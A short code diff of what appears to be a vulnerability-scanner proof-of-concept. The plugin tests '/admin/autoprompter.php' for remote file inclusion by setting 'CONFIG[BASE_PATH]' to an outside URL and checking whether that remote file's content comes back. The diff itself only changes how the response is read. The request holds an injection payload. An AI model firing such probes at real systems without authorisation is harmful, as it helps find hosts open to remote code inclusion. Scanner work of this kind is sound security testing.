@@ -50,7 +50,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + \
                 '/admin/autoprompter.php?CONFIG[BASE_PATH]=http://baidu.com/robots.txt'
-            response = requests.get(vul_url).content
+            response = requests.get(vul_url).text
             if 'Baiduspider' in response or 'Googlebot' in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
